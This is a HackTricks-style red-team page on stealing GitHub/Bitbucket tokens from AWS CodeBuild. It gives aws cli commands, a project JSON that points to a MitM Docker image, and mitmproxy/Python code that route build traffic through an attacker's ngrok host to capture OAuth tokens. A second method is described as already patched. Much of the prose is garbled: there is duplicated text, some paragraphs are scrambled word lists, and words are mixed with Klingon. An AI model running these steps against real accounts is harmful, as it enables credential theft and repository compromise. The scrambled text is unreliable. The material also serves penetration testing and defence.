# AWS Codebuild - Token Leakage

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Recover Github/Bitbucket Configured Tokens

First, check if there are any source credentials configured tha you could leak:

```
QaS Codebuild - Token Leakage

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Recover Github/Bitbucket Configured Tokens

First, check if there are any source credentials configured tha you could leak:
```bash
aws codebuild list-source-credentials
```
### Via Docker Image

**Docker Image** jatlhlaHbe'lu'pu' 'ej **Codebuild** **ghun token** **OAuth token** **exfiltrate** **access** **leak** **authentication** **find** **authentication** **set** **account** **example Github** **use** **Codebuild** **run** **project** **build**.

**Codebuild project** **new** **create** **change** **environment** **existing** **set** **Docker image**.

**Docker image** [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm) **use** **could**. **Docker image** **basic** **very** **is** **env variables `https_proxy`**, **`http_proxy`**, **`SSL_CERT_FILE`** **set**. **traffic** **most** **intercept** **allow** **will** **image** **Docker** **this**.

1. **Docker MitM image** **own** **your** **Create & Upload**
* **repo** **the** **instructions** **Follow** **image** **docker** **build** **cert SSL** **your** **set** **address IP proxy** **your** **set** **proxy** **the** **host** **your** **to** **4444 tcp** **like** **`ngrok`** **use** **could**.
* **metadata endpoint** **requests** **intercept** **not** **TO SET `http_proxy`** **DO**.
* **public repo** **a** **it** **image** **Docker** **have** **you** **Once** **built**.
2. **environment** **the** **Set**
* **existing one** **an** **project** **Codebuild** **new** **Create**.
* **image Docker** **generated previously** **the** **use** **project** **Set**

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

3. **host your in proxy MitM Set**

* **repo Github** **the** **indicated** **As** **like** **something** **use** **could**:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
{% hint style="success" %}
**mitmproxy version used was 9.0.1**, it was reported that with version 10 this might not work.
{% endhint %}

4. **Run the build & capture the credentials**

*   You can see the token in the **Authorization** header:

<figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

This could also be done from the aws cli with something like

{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### ~~Via HTTP protocol~~

{% hint style="success" %}
**This vulnerability was corrected by AWS at some point the week of the 20th of Feb of 2023 (I think on Friday). So an attacker can't abuse it anymore :)**
{% endhint %}

An attacker with **elevated permissions in over a CodeBuild could leak the Github/Bitbucket token** configured or if permissions was configured via OAuth, the **temporary OAuth token used to access the code**.

* An attacker could add the environment variables **http\_proxy** and **https\_proxy** to the CodeBuild project pointing to his machine (for example `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Then, change the URL of the github repo to use HTTP instead of HTTPS, for example: \*\*http://\*\*github.com/carlospolop-forks/TestActions
* Then, run the basic example from [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) in the port pointed by the proxy variables (http\_proxy and https\_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* **Qapla'**, **Build the project** vIghoS, **credentials** **ghItlhmeH** **Sent** **ghItlhmeH** (base64) **mitm port**:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
**vItlhutlh** **ghItlhmeH** **token** **machin**e, **privileges** **list** **'ej** (ab)use **CodeBuild** **service** **directly**.
{% endhint %}

<details>

<summary><strong>**AWS hacking** **zero** **hero** **Learn** **htARTE (HackTricks AWS Red Team Expert)**</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>**!**</strong></a></summary>

**HackTricks** **support** **ways** **Other**:

* **'ej** **HackTricks** **PDF** **download** **company advertised** **want** **If** **Check** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* **official PEASS & HackTricks swag** [**Get**](https://peass.creator-spring.com)
* **The PEASS Family** [**Discover**](https://opensea.io/collection/the-peass-family), **exclusive NFTs** **collection** **our**
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) **telegram group** **the** [**follow**](https://t.me/peass) **us** **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **hacking tricks** **your** **Share** **submitting PRs** **by** [**HackTricks**](https://github.com/carlospolop/hacktricks) **HackTricks Cloud** **github repos** **the**.

</details>
